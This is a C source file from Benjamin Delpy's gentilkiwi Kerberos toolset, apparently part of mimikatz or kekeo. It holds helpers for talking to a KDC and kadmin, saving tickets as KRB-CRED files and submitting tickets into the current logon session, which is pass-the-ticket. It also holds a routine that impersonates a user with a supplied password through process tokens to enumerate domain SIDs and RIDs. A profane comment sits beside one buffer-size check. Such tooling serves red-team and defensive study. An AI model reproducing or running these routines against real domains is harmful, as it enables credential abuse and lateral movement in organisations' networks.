/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by-nc-sa/4.0/
*/
#include "kull_m_kerberos_helper.h"

STRING	kerberosPackageName = {8, 9, MICROSOFT_KERBEROS_NAME_A};
DWORD	g_AuthenticationPackageId_Kerberos = 0;
BOOL	g_isAuthPackageKerberos = FALSE;
HANDLE	g_hLSA = NULL;

BOOL kull_m_kerberos_helper_init()
{
	if(NT_SUCCESS(LsaConnectUntrusted(&g_hLSA)))
		g_isAuthPackageKerberos = NT_SUCCESS(LsaLookupAuthenticationPackage(g_hLSA, &kerberosPackageName, &g_AuthenticationPackageId_Kerberos));
	return g_isAuthPackageKerberos;
}

BOOL kull_m_kerberos_helper_term()
{
	BOOL status = FALSE;
	if(g_hLSA)
		status = NT_SUCCESS(LsaDeregisterLogonProcess(g_hLSA));
	return status;
}

BOOL kull_m_kerberos_helper_net_SendAndRecv(SOCKET *Socket, LPCVOID dataIn, DWORD dataInSize, LPVOID *dataOut, DWORD *dataOutSize)
{
	PVOID data, buffer;
	DWORD dataSize, bufferSize;
	BOOL status = FALSE;

	dataSize = dataInSize + sizeof(DWORD);
	if(data = LocalAlloc(LPTR, dataSize))
	{
		*(PDWORD) data = _byteswap_ulong(dataInSize);
		RtlCopyMemory((PBYTE) data + sizeof(DWORD), dataIn, dataInSize);
		if(status = kull_m_sock_SendAndRecv(Socket, data, dataSize, &buffer, &bufferSize))
		{
			*dataOutSize = bufferSize - sizeof(DWORD);
			if(*dataOut = LocalAlloc(LPTR, *dataOutSize))
			{
				RtlCopyMemory(*dataOut, (PBYTE) buffer + sizeof(DWORD), *dataOutSize);
				if(!(status = (*dataOutSize == _byteswap_ulong(*(PDWORD) buffer))))
					PRINT_ERROR("Packet size + 4 != Kerberos Packet Size\n");

				if(!status)
					LocalFree(*dataOut);
			}
			LocalFree(buffer);
		}
		LocalFree(data);
	}
	return status;
}

BOOL kull_m_kerberos_helper_net_callKdcOssBuf(SOCKET *Socket, OssBuf *in, LPVOID * out, int outPdu)
{
	BOOL status = FALSE;
	OssBuf receivedData;
	*out = NULL;
	if(kull_m_kerberos_helper_net_SendAndRecv(Socket, in->value, in->length, (LPVOID *) &receivedData.value, (DWORD *) &receivedData.length))
	{
		status = kull_m_kerberos_asn1_helper_util_decodeOrTryKrbError(&receivedData, outPdu, out);
		LocalFree(receivedData.value);
	}
	return status;
}

BOOL kull_m_kerberos_helper_net_callKadminOssBuf(SOCKET *Socket, OssBuf *ReqIn, OssBuf *KrbPrivIn, AP_REP **ApRep, KRB_PRIV **KrbPriv)
{
	BOOL status = FALSE;
	PVOID bufferIn, bufferOut;
	DWORD sizeIn = 6 + ReqIn->length + KrbPrivIn->length, sizeOut;
	OssBuf buf;

	*ApRep = NULL;
	*KrbPriv = NULL;
	if(bufferIn = LocalAlloc(LPTR, sizeIn))
	{
		((PWORD) bufferIn)[0] = _byteswap_ushort((WORD) sizeIn);
		((PWORD) bufferIn)[1] = _byteswap_ushort(1/*0xff80*/);
		((PWORD) bufferIn)[2] = _byteswap_ushort((WORD) ReqIn->length);
		RtlCopyMemory((PBYTE) bufferIn + 6, ReqIn->value, ReqIn->length);
		RtlCopyMemory((PBYTE) bufferIn + 6 + ReqIn->length, KrbPrivIn->value, KrbPrivIn->length);

		if(kull_m_kerberos_helper_net_SendAndRecv(Socket, bufferIn, sizeIn, &bufferOut, &sizeOut))
		{
			if((sizeOut == _byteswap_ushort(((PWORD) bufferOut)[0])) && (sizeOut > 6)) // ok fuck, exploit me
			{
				buf.length = _byteswap_ushort(((PWORD) bufferOut)[2]);
				buf.value = (PBYTE) bufferOut + 6;
				if(kull_m_kerberos_asn1_helper_util_decodeOrTryKrbError(&buf, AP_REP_PDU, (LPVOID *) ApRep))
				{
					buf.length = sizeOut - 6 - _byteswap_ushort(((PWORD) bufferOut)[2]);
					buf.value = (PBYTE) bufferOut + 6 + _byteswap_ushort(((PWORD) bufferOut)[2]);

					status = kull_m_kerberos_asn1_helper_util_decodeOrTryKrbError(&buf, KRB_PRIV_PDU, (LPVOID *) KrbPriv);
					if(!status)
					{
						if(*KrbPriv)
							kull_m_kerberos_asn1_helper_ossFreePDU(KRB_PRIV_PDU, *KrbPriv);
						if(*ApRep)
							kull_m_kerberos_asn1_helper_ossFreePDU(AP_REP_PDU, *ApRep);
					}
				}
			}
			else PRINT_ERROR("Size\n");
			
			LocalFree(bufferOut);
		}
		LocalFree(bufferIn);
	}
	return status;
}

BOOL kull_m_kerberos_helper_util_SaveRepAsKrbCred(KDC_REP *rep, EncKDCRepPart *encRepPart, LPCSTR filename)
{
	BOOL status = FALSE;
	OssBuf KrbCred;
	if(kull_m_kerberos_asn1_helper_build_KrbCred(&rep->crealm, &rep->cname, encRepPart, &rep->ticket, &KrbCred))
	{
		if(filename)
		{
			if(status = kull_m_file_writeData(filename, KrbCred.value, KrbCred.length))
				kprintf("  * Ticket in file \'%s\'\n", filename);
			else PRINT_ERROR_AUTO("kull_m_file_writeData");
		}
		else
		{
			if(status = NT_SUCCESS(kull_m_kerberos_helper_util_ptt_data(KrbCred.value, KrbCred.length)))
				kprintf("  * Ticket successfully submitted for current session\n");
		}
		kull_m_kerberos_asn1_helper_ossFreeBuf(KrbCred.value);
	}
	return status;
}

NTSTATUS kull_m_kerberos_helper_util_LsaCallKerberosPackage(PVOID ProtocolSubmitBuffer, ULONG SubmitBufferLength, PVOID *ProtocolReturnBuffer, PULONG ReturnBufferLength, PNTSTATUS ProtocolStatus)
{
	NTSTATUS status = STATUS_HANDLE_NO_LONGER_VALID;
	if(g_hLSA && g_isAuthPackageKerberos)
		status = LsaCallAuthenticationPackage(g_hLSA, g_AuthenticationPackageId_Kerberos, ProtocolSubmitBuffer, SubmitBufferLength, ProtocolReturnBuffer, ReturnBufferLength, ProtocolStatus);
	return status;
}

NTSTATUS kull_m_kerberos_helper_util_ptt_data(PVOID data, DWORD dataSize)
{
	NTSTATUS status = STATUS_MEMORY_NOT_ALLOCATED, packageStatus;
	DWORD submitSize, responseSize;
	PKERB_SUBMIT_TKT_REQUEST pKerbSubmit;
	PVOID dumPtr;
	
	submitSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + dataSize;
	if(pKerbSubmit = (PKERB_SUBMIT_TKT_REQUEST) LocalAlloc(LPTR, submitSize))
	{
		pKerbSubmit->MessageType = KerbSubmitTicketMessage;
		pKerbSubmit->KerbCredSize = dataSize;
		pKerbSubmit->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST);
		RtlCopyMemory((PBYTE) pKerbSubmit + pKerbSubmit->KerbCredOffset, data, dataSize);

		status = kull_m_kerberos_helper_util_LsaCallKerberosPackage(pKerbSubmit, submitSize, &dumPtr, &responseSize, &packageStatus);
		if(NT_SUCCESS(status))
		{
			status = packageStatus;
			if(!NT_SUCCESS(status))
				PRINT_ERROR("LsaCallAuthenticationPackage KerbSubmitTicketMessage / Package : %08x\n", status);
		}
		else PRINT_ERROR("LsaCallAuthenticationPackage KerbSubmitTicketMessage : %08x\n", status);

		LocalFree(pKerbSubmit);
	}
	return status;
}

#ifdef MIMIKATZ_DS_NEEDED
BOOL kull_m_kerberos_helper_net_getDC(LPCSTR fullDomainName, DWORD altFlags, LPSTR * fullDCName)
{
	BOOL status = FALSE;
	DWORD ret, size;
	PDOMAIN_CONTROLLER_INFO cInfo = NULL;
	ret = DsGetDcName(NULL, fullDomainName, NULL, NULL, altFlags | DS_IS_DNS_NAME | DS_RETURN_DNS_NAME, &cInfo);
	if(ret == ERROR_SUCCESS)
	{
		size = (strlen(cInfo->DomainControllerName + 2) + 1) * sizeof(char);
		if(*fullDCName = (char *) LocalAlloc(LPTR, size))
		{
			status = TRUE;
			RtlCopyMemory(*fullDCName, cInfo->DomainControllerName + 2, size);
		}
		NetApiBufferFree(cInfo);
	}
	else PRINT_ERROR("DsGetDcName: %u\n", ret);
	return status;
}
#endif

#ifdef MIMIKATZ_SAMLIB_NEEDED
const wchar_t PREFIX_CIFS[] = L"cifs/";
void kull_m_kerberos_helper_util_impersonateToGetData(PCSTR user, PCSTR domain, PCSTR password, PCSTR kdc, PSID *sid, DWORD *rid, DWORD *pNbDc, PDS_DOMAIN_CONTROLLER_INFO_1 *dcInfos)
{
	NTSTATUS status;
	DWORD ret, *aRid, *usage, unk0 = 0, szPrefix = sizeof(PREFIX_CIFS); // includes NULL;
	ANSI_STRING aUser, aKdc, aDomain, aPass, aProg;
	UNICODE_STRING uUser, uKdc, uDomain, uPass, uProg;
	SAMPR_HANDLE hServerHandle = 0, hDomainHandle = 0;
	PSID domainSid;
	HANDLE hToken, hNewToken, hPds;
	RPC_AUTH_IDENTITY_HANDLE hRPCAuth;
	LPWSTR fullServer;
	PROCESS_INFORMATION processInfos;
	STARTUPINFOW startupInfo = {0};

	startupInfo.cb = sizeof(STARTUPINFOW);
	RtlInitString(&aUser, user);
	RtlInitString(&aKdc, kdc);
	RtlInitString(&aDomain, domain);
	RtlInitString(&aPass, password);
#pragma warning(push)
#pragma warning(disable:4996)
	RtlInitString(&aProg, _pgmptr);
#pragma warning(pop)
	if(NT_SUCCESS(RtlAnsiStringToUnicodeString(&uUser, &aUser, TRUE)))
	{
		if(NT_SUCCESS(RtlAnsiStringToUnicodeString(&uKdc, &aKdc, TRUE)))
		{
			if(NT_SUCCESS(RtlAnsiStringToUnicodeString(&uDomain, &aDomain, TRUE)))
			{
				ret = DsMakePasswordCredentials(user, domain, password, &hRPCAuth);
				if(ret == ERROR_SUCCESS)
				{
					if(pNbDc && dcInfos)
					{
						ret = DsBindWithCred(kdc, domain, hRPCAuth, &hPds);
						if(ret == ERROR_SUCCESS)
						{
							ret = DsGetDomainControllerInfo(hPds, domain, 1, pNbDc, (PVOID *) dcInfos);
							if(ret == ERROR_SUCCESS)
								kprintf("[KDC] %u server(s) in list\n", *pNbDc);
							else PRINT_ERROR("DsGetDomainControllerInfo: %u\n", ret);
							DsUnBind(&hPds);
						}
						else PRINT_ERROR("DsBindWithCred: %u\n", ret);
					}

					if(sid || rid)
					{
						kprintf("[SID/RID] \'%s @ %s\' must be translated to SID/RID\n", user, domain);
						if(fullServer = (LPWSTR) LocalAlloc(LPTR, szPrefix + uKdc.Length))
						{
							RtlCopyMemory(fullServer, PREFIX_CIFS, szPrefix);
							RtlCopyMemory((PBYTE) fullServer + (szPrefix - sizeof(wchar_t)), uKdc.Buffer, uKdc.Length);
							status = SamConnectWithCreds(&uKdc, &hServerHandle, SAM_SERVER_CONNECT | SAM_SERVER_LOOKUP_DOMAIN, NULL, hRPCAuth, fullServer, &unk0);
							if(status == RPC_NT_UNKNOWN_AUTHN_SERVICE)
								status = SamConnectWithCreds(&uKdc, &hServerHandle, SAM_SERVER_CONNECT | SAM_SERVER_LOOKUP_DOMAIN, NULL, hRPCAuth, NULL, &unk0);
							else if(status == STATUS_INVALID_HANDLE) // 2000 :(
							{
								kprintf("[AUTH] Impersonation (Windows 2000 target ?)\n");
								if(NT_SUCCESS(RtlAnsiStringToUnicodeString(&uPass, &aPass, TRUE)))
								{
									if(NT_SUCCESS(RtlAnsiStringToUnicodeString(&uProg, &aProg, TRUE)))
									{
										if(CreateProcessWithLogonW(uUser.Buffer, uDomain.Buffer, uPass.Buffer, LOGON_NETCREDENTIALS_ONLY, uProg.Buffer, NULL, CREATE_SUSPENDED, NULL, NULL, &startupInfo, &processInfos))
										{
											if(OpenProcessToken(processInfos.hProcess, TOKEN_DUPLICATE, &hToken))
											{
												if(DuplicateTokenEx(hToken, TOKEN_QUERY | TOKEN_IMPERSONATE, NULL, SecurityDelegation, TokenImpersonation, &hNewToken))
												{
													if(SetThreadToken(NULL, hNewToken))
														status = SamConnect(&uKdc, &hServerHandle, SAM_SERVER_CONNECT | SAM_SERVER_LOOKUP_DOMAIN, FALSE);
													RevertToSelf();
												}
												else PRINT_ERROR_AUTO("SetThreadToken");
												CloseHandle(hNewToken);
											}
											else PRINT_ERROR_AUTO("DuplicateTokenEx");
											CloseHandle(hToken);
										}
										else PRINT_ERROR_AUTO("OpenProcessToken");
										TerminateProcess(processInfos.hProcess, 0);
										CloseHandle(processInfos.hProcess);
										CloseHandle(processInfos.hThread);
										RtlFreeUnicodeString(&uProg);
									}
									else PRINT_ERROR_AUTO("CreateProcessWithLogonW");
									RtlFreeUnicodeString(&uPass);
								}
							}
							if(NT_SUCCESS(status))
							{
								status = SamLookupDomainInSamServer(hServerHandle, &uDomain, &domainSid);
								if(NT_SUCCESS(status))
								{
									status = SamOpenDomain(hServerHandle, DOMAIN_LIST_ACCOUNTS | DOMAIN_LOOKUP, domainSid, &hDomainHandle);
									if(NT_SUCCESS(status))
									{
										if(rid)
										{
											status = SamLookupNamesInDomain(hDomainHandle, 1, &uUser, &aRid, &usage);
											if(NT_SUCCESS(status))
												*rid = aRid[0];
											else PRINT_ERROR("SamLookupNamesInDomain %08x\n", status);
										}
									}
									else PRINT_ERROR("SamOpenDomain %08x\n", status);

									if(sid)
									{
										ret = GetLengthSid(domainSid);
										if(*sid = (PSID) LocalAlloc(LPTR, ret))
										{
											if(!CopySid(ret, *sid, domainSid))
											{
												*sid = (PSID) LocalFree(*sid);
												PRINT_ERROR_AUTO("CopySid");
											}
										}
									}
									SamFreeMemory(domainSid);
								}
								else PRINT_ERROR("SamLookupDomainInSamServer %08x\n", status);
								SamCloseHandle(hServerHandle);
							}
							else PRINT_ERROR("SamConnectWithCreds %08x\n", status);
							LocalFree(fullServer);
						}
					}
					DsFreePasswordCredentials(hRPCAuth);
				}
				else PRINT_ERROR("DsMakePasswordCredentials: %u\n", ret);
				RtlFreeUnicodeString(&uDomain);
			}
			RtlFreeUnicodeString(&uKdc);
		}
		RtlFreeUnicodeString(&uUser);
	}
}
#endif